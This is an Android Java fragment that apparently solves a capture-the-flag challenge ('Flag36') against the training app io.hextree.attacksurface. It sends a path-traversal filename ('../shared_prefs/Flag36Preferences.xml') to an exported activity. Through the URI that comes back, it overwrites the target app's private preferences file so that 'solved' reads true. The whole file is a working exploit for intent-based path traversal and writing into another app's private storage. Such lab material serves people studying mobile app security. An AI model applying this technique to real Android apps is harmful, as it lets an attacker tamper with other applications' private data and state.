package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

public class Flag36Fragment extends Fragment {
    private static final String TAG = "Flag36Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag36, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag36);
        
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity"));
            intent.putExtra("filename","../shared_prefs/Flag36Preferences.xml");
            startActivityForResult(intent, 1337);
        });

        return view;
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        Utils.showDialog(getContext(), intent);
        OutputStream outputStream = null;
        try {
            Uri uri = intent.getData();
            if (uri == null) {
                Toast.makeText(getContext(), "No URI returned", Toast.LENGTH_SHORT).show();
                return;
            }

            outputStream = requireContext().getContentResolver().openOutputStream(uri);
            if (outputStream == null) {
                Toast.makeText(getContext(), "Unable to open output stream", Toast.LENGTH_SHORT).show();
                return;
            }

            String xmlContent = "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n" +
                    "<map>\n" +
                    "    <boolean name=\"solved\" value=\"true\" />\n" +
                    "</map>\n";

            outputStream.write(xmlContent.getBytes(StandardCharsets.UTF_8));
            outputStream.flush();

            Toast.makeText(getContext(), "XML content written successfully\nOpen the Flag36 Activity to get the flag", Toast.LENGTH_LONG).show();
            Log.d(TAG, "[+] XML written to: " + uri.toString());
        } catch (IOException e) {
            Log.e(TAG, "Write failed", e);
            Toast.makeText(getContext(), "Failed to write: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        } finally {
            if (outputStream != null) {
                try {
                    outputStream.close();
                } catch (IOException ignored) {}
            }
        }
    }
} 